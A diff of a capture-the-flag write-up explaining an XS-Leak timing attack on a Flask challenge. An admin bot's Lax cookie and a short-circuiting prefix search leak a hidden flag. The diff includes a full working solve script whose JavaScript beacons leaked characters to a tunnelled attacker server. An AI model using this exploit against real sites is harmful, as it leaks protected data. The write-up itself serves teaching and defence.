@@ -36,7 +36,15 @@ Attachments:\
 
 Note: the challenge instance used by this writeup is at `http://chal.polyuctf.com:47263`
 
-## The Beginning
+<details>
+  <summary><b>Click to open/close TL;DR and save your time</b></summary>
+  
+This challenge is an intended **XS-Leak timing attack** on an admin-only endpoint with prefix oracle. The bot sets an `admin_secret` cookie for `localhost`, visits an attacker-controlled page, and that page can force top-level navigations to `http://localhost:5000/search?flag=...`, which includes the `SameSite=Lax` cookie on navigation requests.
+
+The vulnerable endpoint checks `any(f for f in flags if f.startswith(flag))`, and because the real internal flag is stored before a huge list of spammed fake flags, a correct prefix returns much faster than a wrong prefix. By repeatedly measuring navigation timing, we can recover the internal flag, then submit it to `/submit_flag` to obtain the real flag.
+</details>
+
+## **The Beginning**
 
 We are given a Flask app with an admin bot, inside the website we have 4 different endpoints (except the obvious `/` duhhh):
 
@@ -63,12 +71,25 @@ So basically, to get our actual PUCTF26 flag, we need to first find the leakyctf
 **Q - Why does this Q&A look unnecessary?**\
 A - Because I can't think of any Q&A here
 
-## Vuln? Where
+## **Vuln? Where**
 
 In `/search` endpoint, we can see a linear flag search.
 
 ```py
-foundFlag = any(f for f in flags if f.startswith(flag))
+@app.route('/search')
+def search():
+    if request.cookies.get('admin_secret', '') != config.ADMIN_SECRET:
+        return 'Access denied. Only admin can access this endpoint.', 403
+
+    flag = request.args.get('flag', '')
+    if not flag:
+        return 'Invalid flag', 400
+
+    foundFlag = any(f for f in flags if f.startswith(flag))  # <- THIS
+    if not foundFlag:
+        return 'Your flag was not found in our key-value store.', 200
+
+    return 'Your flag was found in our key-value store!', 200
 ```
 
 Linear search from beginning with correct flag at index 0? It is screaming timing oracle attack, if the flag list is big enough then:
@@ -76,7 +97,7 @@ Linear search from beginning with correct flag at index 0? It is screaming timin
 Correct prefix -> hits index 0 instantly -> fast return\
 Wrong prefix -> scans **all** of the many fake flags-> slow
 
-And voila we have a `/spam_flag` endpoint to populate the flags list quickly, how convenient <sub>*lol*</sub>
+And voila we have a `/spam_flag` endpoint to populate the flags list quickly and amplify the oracle difference, how convenient <sub>*lol*</sub>
 
 Sadly, **only admin** has access to this vulnerable `/search` endpoint, because before the linear search where the timing difference take place, we have this cookie check.
 
@@ -92,25 +113,28 @@ Thats unfortunate, we are not admin, but we do have access to the `/report` endp
 **Q - Why so convenient?**\
 A - Because this is a convenient <sub>(flag)</sub> store (jk no)
 
-## The convenient admin bot
+## **The convenient admin bot**
 
 Since the bot is our entry point, lets take a closer look at it (bot.py)
 
-The bot sets `admin_secret` cookie for domain `localhost` with `SameSite=Lax` + `HttpOnly`, and then visits a user-supplied URL for 60 seconds.
+The bot sets `admin_secret` cookie for domain `localhost` with [`SameSite=Lax`](https://web.dev/articles/samesite-cookies-explained#use-samesite) + `HttpOnly`, and then visits a user-supplied URL for 60 seconds.
 
 With this cookie settings, we **cannot** use `fetch()` (cross-origin) or `document.cookie` (violates HttpOnly) to leak the admin cookie, so we have to make the bot visit `/search` endpoint.
 
 However, because it's Lax, top-level navigations (e.g. `window.location = ...` or `win.location = ...` in a popup) **will send** the cookie to `http://localhost:5000` and thus `/search`.
 
-We cannot read the response body (SOP), but we **can** measure how long a popup stays same-origin before the cross-origin navigation commits.
+Okay now we can make it access `/search`, but sadly (again), we **cannot** read the response body of it because its **cross-origin** (attacker page != localhost), and the browser’s same-origin policy (SOP) prevents arbitrary cross-origin DOM/response access. Not so convenient now huh?
+
+HOWEVRAA, we **can** measure how long a popup stays same-origin before the cross-origin navigation commits.
 
 - prefix matched (hit index 0) -> page loaded quickly -> Fast commit time
 - full scan (miss)   -> page took longer to respond   -> Slow commit time
 
+aka a timing oracle attack
+
 ## The convenient admin bot - checkpoint Q&A
 
-**Q - Ok this Q should be on the last checkpoint but this checkpoint is empty so Ima place it here (Im sorry)**\
-**How and why does the timing oracle attack work?**\
+**Q - How and why does the timing oracle attack work?**\
 A - Picture this:\
 we have an array of ["yay1", "no3", "no2", "no4", "no9", "no6"], we can search it using the `foundFlag` logic above, and we want to see the value behind yay
 
@@ -124,7 +148,7 @@ Then, we search yay11 10ms, yay12 10ms, and so on. Since all of them are similar
 
 So, thats basically how timing oracle for linear search works
 
-## The flow
+## **The flow**
 
 Now we can have the exploit flow
 
@@ -201,14 +225,27 @@ The character with the highest score is the one we want.
 
 Now, we can repeat the above method until we reach eof (end of flag aka `}` not end of file lol) to slowly get the full internal flag
 
+```js
+while (prefix.slice(-1) !== "}") {
+  prefix = get_char(prefix);
+}
+```
+
+Hol'up, there is a big problem. We simply can't make the bot reliably find the whole flag in that one shot.\
+Why? Because the bot only give our script 60s to run before quitting, and even finding a single char in the flag takes about 0.5x2x(17+3)+jitter ~ 25s, we can't even fit 3 characters in 60s.
+
+So, to get the whole flag, we "think out of the box", why don't we just make the bot find 1 character at a time, and we gather and stitch the whole flag on our side? We just send alot of requests to `/report` and every request gives us another 60s
+
 ```py
 while prefix[-1] != "}":
-        prefix = run_one_round(prefix)
+    prefix = run_one_round(prefix)
 ```
+
+yep, that sounds like a working plan
 
 ### Step 6
 
-And since we have the full internal flag, we can submit it to `/submit_flag` to get our real flag
+And since we have the full internal flag from the reports, we can just submit it to `/submit_flag` to get our real flag lol
 
 ```py
 requests.get(f"http://chal.polyuctf.com:47263/submit_flag", params={"flag": flag})
@@ -217,12 +254,12 @@ requests.get(f"http://chal.polyuctf.com:47263/submit_flag", params={"flag": flag
 ## The flow - checkpoint Q&A
 
 **Q - Why popup instead of fetch?**\
-A - `fetch()` with `no-cors` still sends cookie (Lax), but timing is noisy. Navigation timing via `while (try { void win.location.href } catch {})` gives a very clean signal of when the server responded.
+A - `fetch()` with `no-cors` still sends cookie (Lax), but timing is noisy. Navigation timing via `while (try { void win.location.href } catch {})` gives a much more clean signal of when the server responded.
 
 **Q - Why add `!` behind force miss attempts?**\
 A - Both the real flag and the fake flags consists of `0-9a-f{}lgkytf` (because leakyctf{hex} and flag{hex}), we CAN use any symbols that are not in that lil regex but for safety reason a symbol like `!` is fine.
 
-## The Exploit
+## **The Exploit**
 
 Full exploit (also in [`./solve.py`](./solve.py))
 
@@ -247,13 +284,14 @@ import requests
 from playwright.async_api import async_playwright
 
 CHAL_BASE = "http://chal.polyuctf.com:47263"
-STATE_FILE = Path("State.json")
+STATE_FILE = Path("State.json") # Persistent state file to resume brute-force from last known prefix
 
-TURNSTILE_WAIT = 120
-BOT_WAIT = 90
+TURNSTILE_WAIT = 120 # How long to wait for Turnstile token in browser
+BOT_WAIT = 90 # How long to wait for bot to finish visiting + leaking one char
 
 INTERNAL_FLAG_RE = re.compile(r"^leakyctf\{[0-9a-f]{8}\}$")
 REAL_FLAG_RE = re.compile(r"PUCTF26\{[A-Za-z0-9_]+_[0-9A-Fa-f]{32}\}")
+
 
 HTML_TEMPLATE = """<!doctype html>
 <meta charset="utf-8">
@@ -263,13 +301,15 @@ HTML_TEMPLATE = """<!doctype html>
 const PREFIX = "__PREFIX__"; // will be replaced with known flag part
 const TARGET = "http://localhost:5000/search?flag="; // the base url
 const HEX = "0123456789abcdef}"; // (not really hex because there is a close curly bracket but the well its the charset for brute)
-const FAST_ACCEPT_GAP = 8.0;
-const MIN_GOOD_SCORE = 10.0;
+const FAST_ACCEPT_GAP = 8.0;     // min difference between best & second-best to auto-accept
+const MIN_GOOD_SCORE = 10.0;     // minimum median delta to consider a candidate serious
 
+// Sleep duhh
 function sleep(ms) {
   return new Promise(r => setTimeout(r, ms));
 }
 
+// shuffle to randomize candidate order (avoids timing bias)
 function shuffle(arr) { // used to shuffle the candidate array
   const a = [...arr];
   for (let i = a.length - 1; i > 0; i--) {
@@ -279,11 +319,13 @@ function shuffle(arr) { // used to shuffle the candidate array
   return a;
 }
 
+// Find median duhh
 function median(vals) {
   const a = [...vals].sort((x, y) => x - y);
   return a[Math.floor(a.length / 2)];
 }
 
+// Beacon back to our server (no-cors so no preflight, cache busting)
 async function beacon(path, obj) { // send beacon back to host so we know what is going on during the brute
   const qs = new URLSearchParams(obj).toString();
   try {
@@ -291,7 +333,8 @@ async function beacon(path, obj) { // send beacon back to host so we know what i
   } catch (e) {}
 }
 
-async function waitAccessible(win) { // wait until the window is accessible
+// Wait until popup is same-origin accessible (after reset)
+async function waitAccessible(win) {
   while (true) {
     try {
       void win.location.href;
@@ -301,6 +344,7 @@ async function waitAccessible(win) { // wait until the window is accessible
   }
 }
 
+// Make a popup to /search and measure hit/miss time
 async function probe(win, prefix) {
   win.location = "/blank?x=" + Math.random();
   await waitAccessible(win);
@@ -318,6 +362,7 @@ async function probe(win, prefix) {
   }
 }
 
+// Do 2 probes (1 hit 1 miss) and measure delta
 async function deltaOnce(win, prefix) {
   const hit = await probe(win, prefix);
   await sleep(15 + Math.floor(Math.random() * 10));
@@ -325,6 +370,7 @@ async function deltaOnce(win, prefix) {
   return { delta: miss - hit, hit, miss };
 }
 
+// Collect multiple measurements for one prefix
 async function collect(win, prefix, rounds) {
   const ds = [];
   for (let i = 0; i < rounds; i++) {
@@ -343,7 +389,9 @@ async function collect(win, prefix, rounds) {
   };
 }
 
+// Main logic duhh
 async function main() {
+  // makes sure popup works
   const win = window.open("/blank", "probe");
   if (!win) {
     await beacon("/progress", { msg: "popup blocked" });
@@ -352,6 +400,7 @@ async function main() {
 
   await beacon("/progress", { msg: "start " + PREFIX });
 
+  // collect results
   let results = [];
   for (const ch of shuffle(HEX.split(""))) {
     const prefix = PREFIX + ch;
@@ -359,11 +408,13 @@ async function main() {
     results.push(r);
   }
 
+  // sort and rank candidates
   results.sort((a, b) => b.score - a.score);
   await beacon("/progress", {
     msg: "rank1 " + results.map(x => `${x.ch}:${x.score.toFixed(2)}`).join(", ")
   });
 
+  // get top 3 character as finalists and do more measurements to determine winner
   const best = results[0];
   const second = results[1];
   if (!(best.score >= MIN_GOOD_SCORE && (best.score - second.score) >= FAST_ACCEPT_GAP)) {
@@ -391,6 +442,7 @@ async function main() {
   results.sort((a, b) => b.score - a.score);
   const winner = results[0];
 
+  // winner found
   await beacon("/result", {
     ch: winner.ch,
     newprefix: PREFIX + winner.ch,
@@ -406,6 +458,7 @@ main().catch(async (e) => {
 </script>
 """
 
+# Holds leaked char + prefix + logs during one round
 @dataclass
 class State:
     logs: list[str] = field(default_factory=list)
@@ -418,6 +471,7 @@ class State:
         self.logs.append(line)
         print(line, flush=True)
 
+# Custom HTTP handler for attacker server
 class Handler(BaseHTTPRequestHandler):
     state: State | None = None
     html: bytes = b""
@@ -488,6 +542,7 @@ def start_server(state: State, html: bytes, port: int):
     t.start()
     return httpd
 
+# Start localhost.run reverse tunnel (aka tunnel attacker's site to a public URL)
 def start_tunnel(port: int):
     proc = subprocess.Popen(
         [
@@ -543,6 +598,7 @@ def terminate(proc):
     except subprocess.TimeoutExpired:
         proc.kill()
 
+# Spam /spam_flags until list is max size (amplifies timing delta)
 def fill_flags():
     print("[*] filling flags...", flush=True)
     for i in range(9):
@@ -558,6 +614,7 @@ def fill_flags():
     if r.status_code == 400 and "exceed the maximum" in r.text:
         print("[*] flag store already full enough", flush=True)
 
+# Manually solve Turnstile in visible browser window because I am too skill issue to automate CAPTCHA solving
 async def get_turnstile_token():
     async with async_playwright() as p:
         browser = await p.chromium.launch(
@@ -598,6 +655,7 @@ def submit_internal(flag: str):
     r = requests.get(f"{CHAL_BASE}/submit_flag", params={"flag": flag}, timeout=20)
     return r.status_code, r.text
 
+# Run one round, aka get 1 character of the flag
 def run_one_round(prefix: str):
     state = State()
     port = pick_port()
@@ -629,6 +687,7 @@ def run_one_round(prefix: str):
         httpd.server_close()
         terminate(tunnel_proc)
 
+# Main loop
 def main():
     st = load_state()
     prefix = st.get("prefix", "leakyctf{")
@@ -765,3 +824,27 @@ A - Optional debugging — lets you see live progress on your server logs while 
 
 **Q - How does the beacon work?**\
 A - The JS beacons hit our endpoint via the public URL with the message placed in `msg` query param via fetch, so we can get the message from the requests we receive.
+
+## **Aftermath**
+
+This challenge is a nice example of how safe-looking components can become dangerous when combined:
+
+- an admin-only endpoint with indirect access to sensitive info (flag)
+- a bot with sensitive cookies to a targetted website that visits attacker-controlled pages
+- a prefix check with short-circuit behavior
+
+Individually, each piece may look harmless.
+Together, they form a very clean intended XS-Leak.
+
+### Lessons learnt
+
+- **Short-circuit checks are dangerous.**
+  linear search with short-circuiting (like `any()` and `startswith()` <sub>and yes `startswith` is a short-circuiting ~~linear search~~ comparison too</sub>) on attacker-controlled inputs can become a vulnerable timing oracle.
+
+- **SameSite is not an all-powerful shield.**
+  `SameSite=Lax` still allows cookies on top-level navigations, which is exactly what made this solve work.
+
+## Aftermath - checkpoint Q&A
+
+**Q - :moyai:**\
+A - I don't think u need a Q&A for aftermath lol
